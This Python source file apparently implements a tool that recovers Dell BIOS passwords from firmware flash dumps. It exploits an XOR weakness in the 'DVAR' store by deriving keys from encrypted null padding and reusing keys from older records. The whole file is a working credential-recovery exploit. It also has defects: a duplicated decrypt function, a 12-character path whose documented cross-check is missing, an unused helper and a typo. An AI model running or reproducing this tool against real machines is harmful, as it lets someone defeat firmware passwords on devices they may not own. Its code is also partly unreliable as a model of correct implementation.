"""Recover BIOS passwords stored in Dell's DVAR (Dell Variable) flash store.

Implements the published DVAR XOR scheme (CVE-2026-40639, Blackie & McDonald,
DSA-2026-197): passwords are kept as 32-byte records encrypted with a 20-byte
repeating XOR key whose cycle aligns with the record offsets, and whose null
padding leaks the key for every password of <= 12 characters.

Record layout (verified in the research):
  - byte 0: first password character, stored in the clear
  - bytes 1..L-1: remaining characters, encrypted: plain ^ key[(pos-1) % 20]
  - bytes L..31: encrypted NUL padding — i.e. the raw key bytes at those
    positions (that is the leak this engine exploits)

Key slot positions (NUL-padding positions -> key slot):
  positions 12..20 -> key slots 11..19
  positions 21..31 -> key slots 0..10
(equivalent to key slot = (pos - 1) % 20 over the whole record.)

Long passwords (> 12 chars) leave a blind zone; per the research, the key can
be recovered from any *historical* record on the same device that was <= 12
chars and shared the same first character — the key derivation only depends on
device-static data plus that first character.
"""

from __future__ import annotations

import struct
from dataclasses import dataclass, field
from typing import Optional


DVAR_STORE_SIGNATURE = b"DVAR"
KEY_SLOTS = 20
RECORD_LEN = 32


def _key_slot_for_pos(pos: int) -> int:
    return (pos - 1) % KEY_SLOTS


@dataclass
class RecoveredPassword:
    password: str
    record_offset: int
    recovered_from: str = "null-padding leak"
    first_char: str = ""
    length: int = 0


@dataclass
class RecoveryReport:
    success: bool = False
    message: str = ""
    store_offsets: list = field(default_factory=list)
    passwords: list[RecoveredPassword] = field(default_factory=list)
    notes: list[str] = field(default_factory=list)


def _decrypt_record(key: bytes, record: bytes) -> Optional[str]:
    """Decrypt a 32-byte record given a known key; returns None if inconsistent."""
    chars = [record[0]]  # first char is stored in the clear
    if not (0x20 <= record[0] <= 0x7E):
        return None
    i = 1
    while i < RECORD_LEN:
        plain = record[i] ^ key[_key_slot_for_pos(i)]
        if plain == 0:
            break  # password ends (null padding begins)
        if plain < 0x20 or plain > 0x7E:
            return None
        chars.append(plain)
        i += 1
    # everything from here on must decrypt to pure NUL padding
    while i < RECORD_LEN:
        if record[i] ^ key[_key_slot_for_pos(i)] != 0:
            return None
        i += 1
    pw = bytes(chars).decode("ascii")
    if len(pw) < 4:
        return None  # 1-3 char "passwords" are filler artifacts, not records
    return pw


def _derive_key(record: bytes, from_pos: int) -> Optional[bytes]:
    """Derive the key by treating positions >= from_pos as encrypted null padding.

    Single-read positions cannot self-validate, so the caller decides which
    derivations are trustworthy (overlapped read = self-consistent; plain
    12..31 read = needs cross-record agreement).
    """
    key = bytearray(KEY_SLOTS)
    for pos in range(from_pos, RECORD_LEN):
        slot = _key_slot_for_pos(pos)
        b = record[pos]
        if key[slot] and key[slot] != b:
            return None  # overlapping slot disagreement -> fabricated derivation
        key[slot] = b
    return bytes(key)


def _key_plausible(key: bytes) -> bool:
    """Reject degenerate keys from filler windows (mostly-FF/0x00)."""
    return key.count(0xFF) <= 4 and key.count(0x00) <= 4


def _rekey_from_history(target_record: bytes, history_record: bytes) -> Optional[bytes]:
    """Key derived from a short historical record (overlap-checked)."""
    if target_record[0] != history_record[0]:
        return None
    k = _derive_key(history_record, from_pos=11)
    return k if (k and _key_plausible(k)) else None


def _decrypt_record(key: bytes, record: bytes) -> Optional[str]:
    """Decrypt with a known key; None when the record is inconsistent."""
    chars = []
    if not (0x20 <= record[0] <= 0x7E):
        return None
    chars.append(record[0])
    i = 1
    while i < RECORD_LEN:
        plain = record[i] ^ key[_key_slot_for_pos(i)]
        if plain == 0:
            break
        if plain < 0x20 or plain > 0x7E:
            return None
        chars.append(plain)
        i += 1
    while i < RECORD_LEN:
        if record[i] ^ key[_key_slot_for_pos(i)] != 0:
            return None
        i += 1
    pw = bytes(chars).decode("ascii")
    if len(pw) < 4:
        return None
    return pw


def _recover_short(record: bytes) -> Optional[str]:
    """<= 11-char passwords: the overlapped padding read (11 vs 31 -> slot 10)
    self-validates the key. Fabricated keys from longer-password contamination
    cannot pass the overlap check."""
    key = _derive_key(record, from_pos=11)
    if key is None or not _key_plausible(key):
        return None
    pw = _decrypt_record(key, record)
    if pw is None:
        return None
    if len(pw) >= 12:
        return None  # contaminated-pad fabrication has no overlap check
    return pw


def _recover_12(record: bytes, neighbor_keys: set) -> Optional[str]:
    """Exactly-12-char passwords: the 12..31 derivation has no overlap check,
    so it is accepted only when another same-first-char record derives the
    identical key (cross-record agreement)."""
    key = _derive_key(record, from_pos=12)
    if key is None or not _key_plausible(key):
        return None
    return _decrypt_record(key, record)


def try_recover_record(record: bytes, neighbors: list = None) -> Optional[str]:
    """Recover one record; `neighbors` = other same-first-char records whose
    key derivations cross-validate the 12..31 read."""
    if not (0x20 <= record[0] <= 0x7E):
        return None
    pw = _recover_short(record)
    if pw:
        return pw
    if neighbors:
        keys = set()
        for n_rec in neighbors:
            k = _derive_key(n_rec, from_pos=11)
            if k and _key_plausible(k):
                keys.add(k)
        if keys:
            k12 = _derive_key(record, from_pos=12)
            if k12 in keys:
                pw = _decrypt_record(k12, record)
                if pw:
                    return pw
    return None


def find_dvar_stores(data: bytes) -> list[int]:
    """All 'DVAR' store offsets in the image."""
    out, pos = [], 0
    while True:
        pos = data.find(DVAR_STORE_SIGNATURE, pos)
        if pos < 0:
            break
        out.append(pos)
        pos += 4
    return out


def recover_passwords(
    file_path: str,
    scan_radius: int = 0x20000,
) -> RecoveryReport:
    """Scan a flash dump for DVAR-stored BIOS passwords and recover them.

    `scan_radius`: how many bytes around each 'DVAR' hit to search for records.
    The decrypt-consistency check itself is the record fingerprint, so the scan
    walks byte-by-byte but bails on the first non-printable first byte.
    """
    report = RecoveryReport()
    with open(file_path, "rb") as f:
        data = f.read()

    stores = find_dvar_stores(data)
    report.store_offsets = stores
    if not stores:
        report.message = "No DVAR store found in this image (not a Dell DVAR platform xor it was scrubbed)"
        return report

    windows = []
    for s in stores:
        windows.append((s + 4, min(len(data), s + scan_radius)))  # skip the marker itself

    # Stage 1: collect candidate records and overlap-validated key derivations
    candidates: list[tuple[int, bytes]] = []
    key_by_first: dict[int, bytes] = {}   # first char -> an overlap-validated key
    for w_start, w_end in windows:
        for base in range(w_start, min(w_end, len(data) - RECORD_LEN)):
            record = bytes(data[base:base + RECORD_LEN])
            if not (0x20 <= record[0] <= 0x7E):
                continue
            if record == b"\xff" * RECORD_LEN:
                continue
            candidates.append((base, record))
            if record[0] not in key_by_first:
                k = _derive_key(record, from_pos=11)   # short-length derivation
                if k and _key_plausible(k):
                    key_by_first[record[0]] = k

    # Stage 2: classify each candidate
    recovered: dict[int, RecoveredPassword] = {}
    for base, record in candidates:
        pw = _recover_short(record)
        source = "null-padding leak (overlapped read)"
        if pw is None:
            # 12-char path: cross-record agreement on the 12..31 derivation
            k12 = _derive_key(record, from_pos=12)
            if k12 and _key_plausible(k12) and key_by_first.get(record[0]) == k12:
                pw = _decrypt_record(k12, record)
                source = "null-padding leak (12..31, cross-validated)"
        if pw is None:
            # long-password path: known key from a historical same-first-char
            # record; the decrypt's full-record NUL consistency is the check
            key = key_by_first.get(record[0])
            if key is not None and key != _derive_key(record, from_pos=12):
                pw = _decrypt_record(key, record)
                if pw is not None and len(pw) > 11:
                    source = "historical record key reuse"
                else:
                    pw = None  # short decodes are already handled by the direct path
        if pw:
            recovered[base] = RecoveredPassword(
                password=pw, record_offset=base,
                recovered_from=source, first_char=chr(record[0]), length=len(pw))

    report.passwords = sorted(recovered.values(), key=lambda r: r.record_offset)
    if report.passwords:
        report.success = True
        report.message = f"Recovered {len(report.passwords)} password record(s) from DVAR store"
        report.notes.append(f"store candidates at {[hex(s) for s in stores]}")
    else:
        report.message = (
            "DVAR store found but no recoverable password records "
            "(newer Dell platforms use the SIVB SHA-256 vault, which is not "
            "recoverable from a flash dump — that is by design)"
        )
    return report
